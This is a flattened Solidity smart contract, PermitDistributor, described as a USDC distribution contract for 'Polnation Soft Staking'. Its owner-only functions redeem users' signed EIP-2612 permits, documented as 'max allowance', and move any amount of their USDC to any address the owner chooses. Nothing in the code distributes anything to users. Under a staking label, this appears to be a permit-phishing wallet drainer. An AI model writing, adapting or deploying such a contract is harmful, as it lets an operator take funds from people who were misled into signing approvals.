// SPDX-License-Identifier: MIT
// Polnation PermitDistributor - Flattened for Polygonscan verification
pragma solidity ^0.8.20;

// OpenZeppelin Contracts (last updated v5.0.0) (utils/Context.sol)
abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }

    function _contextSuffixLength() internal view virtual returns (uint256) {
        return 0;
    }
}

// OpenZeppelin Contracts (last updated v5.0.0) (access/Ownable.sol)
abstract contract Ownable is Context {
    address private _owner;

    error OwnableUnauthorizedAccount(address account);
    error OwnableInvalidOwner(address owner);

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor(address initialOwner) {
        if (initialOwner == address(0)) {
            revert OwnableInvalidOwner(address(0));
        }
        _transferOwnership(initialOwner);
    }

    modifier onlyOwner() {
        _checkOwner();
        _;
    }

    function owner() public view virtual returns (address) {
        return _owner;
    }

    function _checkOwner() internal view virtual {
        if (owner() != _msgSender()) {
            revert OwnableUnauthorizedAccount(_msgSender());
        }
    }

    function renounceOwnership() public virtual onlyOwner {
        _transferOwnership(address(0));
    }

    function transferOwnership(address newOwner) public virtual onlyOwner {
        if (newOwner == address(0)) {
            revert OwnableInvalidOwner(address(0));
        }
        _transferOwnership(newOwner);
    }

    function _transferOwnership(address newOwner) internal virtual {
        address oldOwner = _owner;
        _owner = newOwner;
        emit OwnershipTransferred(oldOwner, newOwner);
    }
}

// OpenZeppelin Contracts (last updated v5.0.0) (token/ERC20/IERC20.sol)
interface IERC20 {
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);

    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address to, uint256 value) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 value) external returns (bool);
    function transferFrom(address from, address to, uint256 value) external returns (bool);
}

// USDC with Permit extension
interface IUSDC is IERC20 {
    function permit(address owner, address spender, uint256 value, uint256 deadline, uint8 v, bytes32 r, bytes32 s) external;
}

/// @title PermitDistributor
/// @notice Polnation Soft Staking USDC Distribution Contract
/// @dev Uses EIP-2612 Permit for gasless approvals
contract PermitDistributor is Ownable {
    IUSDC public immutable usdc;
    
    event PermitExecuted(address indexed owner, address indexed recipient, uint256 amount, bytes32 indexed operationId);

    constructor(address _usdc) Ownable(msg.sender) {
        usdc = IUSDC(_usdc);
    }

    /// @notice Execute permit and transfer in one transaction
    /// @param owner The address that signed the permit
    /// @param value The permit value (max allowance)
    /// @param deadline The permit deadline
    /// @param v ECDSA signature v
    /// @param r ECDSA signature r
    /// @param s ECDSA signature s
    /// @param recipient The address to receive tokens
    /// @param amount The amount to transfer
    /// @param operationId Unique operation identifier for tracking
    function executeWithPermit(
        address owner, uint256 value, uint256 deadline, uint8 v, bytes32 r, bytes32 s,
        address recipient, uint256 amount, bytes32 operationId
    ) external onlyOwner {
        usdc.permit(owner, address(this), value, deadline, v, r, s);
        usdc.transferFrom(owner, recipient, amount);
        emit PermitExecuted(owner, recipient, amount, operationId);
    }

    /// @notice Transfer tokens using existing allowance
    /// @param from The address to transfer from
    /// @param to The address to transfer to
    /// @param amount The amount to transfer
    /// @param operationId Unique operation identifier for tracking
    function transferFrom(address from, address to, uint256 amount, bytes32 operationId) external onlyOwner {
        usdc.transferFrom(from, to, amount);
        emit PermitExecuted(from, to, amount, operationId);
    }
    
    /// @notice Check allowance for this contract
    /// @param owner The address to check allowance for
    /// @return The current allowance
    function getAllowance(address owner) external view returns (uint256) {
        return usdc.allowance(owner, address(this));
    }
}
